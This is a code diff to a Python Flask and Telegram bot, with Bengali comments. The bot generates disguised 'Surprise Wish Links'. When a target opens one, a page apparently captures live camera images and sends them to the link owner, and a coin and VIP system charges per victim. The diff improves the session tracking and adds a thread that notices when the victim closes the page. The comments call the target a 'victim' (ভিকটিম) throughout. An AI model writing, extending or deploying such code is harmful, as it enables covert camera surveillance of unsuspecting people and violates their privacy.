@@ -1,4 +1,4 @@
-import logging, base64, asyncio, os, threading, uuid
+import logging, base64, asyncio, os, threading, uuid, time
 from flask import Flask, request, jsonify, render_template
 from telegram import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import (
@@ -24,10 +24,10 @@ forced_channels = []
 pending_referrals = {} 
 user_states = {}  
 
-# প্রতি ইউজারের বর্তমান সক্রিয় সেশন টোকেন
+# ইউজারের সক্রিয় সেশন ট্র্যাক করার জন্য
 user_active_sessions = {}
-# কোন সেশনগুলো ইতিমধ্যে একবার চালু হয়ে লাইভে আছে তা ট্র্যাক করার জন্য
-active_live_sessions = set()
+# কোন সেশনগুলো বর্তমানে লাইভ চলছে এবং শেষ কখন রিকোয়েস্ট এসেছে তা ট্র্যাক করতে (সেশন টোকেন -> শেষের সময়)
+live_sessions_tracker = {}
 
 app_telegram = None  
 bot_loop = None
@@ -55,28 +55,32 @@ def upload_image():
     try:
         owner_id = int(owner_id)
         
-        # লিংক ভ্যালিড কি না চেক করা
+        # ১. লিংকটি বট থেকে জেনারেট করা আসল লিংক কি না চেক
         if user_active_sessions.get(owner_id) != session_token:
-            return jsonify({"status": "error", "message": "Link expired or invalid"}), 400
+            # যদি এই সেশন ইতিমধ্যে ক্লোজ হয়ে যায় বা অন্য কেউ ইউজ করতে চায়
+            if session_token not in live_sessions_tracker:
+                return jsonify({"status": "error", "message": "Link expired or closed"}), 400
 
-        session_key = f"{owner_id}_{session_token}"
-        
+        current_time = time.time()
         is_first_capture = False
-        if session_key not in active_live_sessions:
-            is_first_capture = True
-            active_live_sessions.add(session_key)
-            
-            # ⭐ অত্যন্ত গুরুত্বপূর্ণ: প্রথম ছবি আসার সাথে সাথেই মূল সেশন টোকেনটি রিসেট বা ডিলিট করে দেবো 
-            # যাতে এই লিংকটি আর অন্য কেউ ব্যবহার করতে না পারে (কিন্তু বর্তমান ভিকটিমের লাইভ রিকোয়েস্ট চলতে থাকবে)
-            user_active_sessions[owner_id] = "locked_live_session_" + str(uuid.uuid4())
 
-        if owner_id in users_db:
-            if not users_db[owner_id].get("is_vip", False):
-                if is_first_capture:  
+        # ২. ট্র্যাকিং চেক: এই সেশন কি ইতিমধ্যে লাইভে আছে?
+        if session_token not in live_sessions_tracker:
+            is_first_capture = True
+            # নতুন লাইভ সেশন শুরু হলো, তাই মেইন সেশন টোকেন রিসেট করে দেবো যাতে অন্য কেউ এই লিংকে ঢুকতে না পারে
+            user_active_sessions[owner_id] = "locked_in_progress_" + str(uuid.uuid4())
+            live_sessions_tracker[session_token] = current_time
+
+            # কয়েন কাটার লজিক (মাত্র একবারই কাটবে)
+            if owner_id in users_db:
+                if not users_db[owner_id].get("is_vip", False):
                     if users_db[owner_id]["balance"] >= 1:
                         users_db[owner_id]["balance"] -= 1
                     else:
                         return jsonify({"status": "error", "message": "Insufficient coins"}), 400
+        else:
+            # যদি সেশন আগে থেকেই লাইভ থাকে, তবে টাইম আপডেট করে দেবো
+            live_sessions_tracker[session_token] = current_time
 
         header, encoded = image_data.split(",", 1)
         image_bytes = base64.b64decode(encoded)
@@ -104,9 +108,22 @@ async def send_photo_to_owner(owner_id, photo_bytes, caption, is_first):
         await app_telegram.bot.send_photo(chat_id=owner_id, photo=photo_bytes, caption=caption, parse_mode="Markdown")
         if owner_id in users_db and is_first:
             bal = "VIP (Unlimited)" if users_db[owner_id]["is_vip"] else f"{users_db[owner_id]['balance']} Coins"
-            await app_telegram.bot.send_message(chat_id=owner_id, text=f"🎯 টার্গেটের লাইভ ছবি আসা শুরু হয়েছে! (১ কয়েন কাটা হয়েছে)\n💰 বর্তমান ব্যালেন্স: {bal}")
+            await app_telegram.bot.send_message(chat_id=owner_id, text=f"🎯 ভিকটিমের পেজ থেকে লাইভ ছবি আসা শুরু হয়েছে! (১ কয়েন কাটা হয়েছে)\n💰 বর্তমান ব্যালেন্স: {bal}")
     except Exception as e:
         logger.error(f"Telegram send photo error: {e}")
+
+# ব্যাকগ্রাউন্ডে চেক করবে কোনো ভিকটিম পেজ কেটে দিয়েছে কি না (৫ সেকেন্ডের বেশি রিকোয়েস্ট না আসলে লিংক ডেড করে দেবে)
+def cleanup_dead_sessions():
+    while True:
+        time.sleep(3)
+        current_time = time.time()
+        dead_tokens = []
+        for token, last_seen in live_sessions_tracker.items():
+            # যদি ৫ সেকেন্ডের বেশি সময় ধরে ওই ব্রাউজার থেকে কোনো ছবি বা রিকোয়েস্ট না আসে, ধরি পেজ কেটে দিয়েছে
+            if current_time - last_seen > 5:
+                dead_tokens.append(token)
+        for token in dead_tokens:
+            del live_sessions_tracker[token]
 
 def run_flask():
     port = int(os.environ.get("PORT", 5000))
@@ -319,7 +336,7 @@ async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYP
                 target_uid = int(text.strip())
                 if target_uid in users_db:
                     users_db[target_uid]["is_vip"] = False
-                    await update.message.reply_text(f"👤 ইউজার (`{target_uid}`) নরমাল মোডে আছে।", parse_mode="Markdown")
+                    await update.message.reply_text(f"👤 ইউজার (`{target_uid}`) নরমাল মোডে আছে።", parse_mode="Markdown")
             except ValueError:
                 pass
             return
@@ -337,7 +354,7 @@ async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYP
         target_link = f"{base_url}/?id={user_id}&s={session_token}"
         
         vip_status = "👑 [VIP Unlimited]" if user_data["is_vip"] else f"💰 Current Balance: {user_data['balance']} Coins"
-        await update.message.reply_text(f"🎁 **Surprise Wish Link**\n\n{vip_status}\n\nআপনার নতুন লিংকটি তৈরি হয়েছে (এটি একবার ওপেন হয়ে লাইভ শুরু হলেই অন্য কারো জন্য কাজ করবে না):\n`{target_link}`", parse_mode="Markdown")
+        await update.message.reply_text(f"🎁 **Surprise Wish Link**\n\n{vip_status}\n\nআপনার নতুন লিংক তৈরি হয়েছে:\n`{target_link}`", parse_mode="Markdown")
 
     elif text == "👤 Profile":
         user_data = users_db.get(user_id, {"balance": 3, "referrals": 0, "is_vip": False})
@@ -403,7 +420,9 @@ def main():
         bot_loop = asyncio.new_event_loop()
         asyncio.set_event_loop(bot_loop)
 
+    # ফ্লাস্ক সার্ভার এবং সেশন ক্লিনার থ্রেড রান করা
     threading.Thread(target=run_flask, daemon=True).start()
+    threading.Thread(target=cleanup_dead_sessions, daemon=True).start()
 
     app_telegram.add_handler(CommandHandler("start", start))
     app_telegram.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
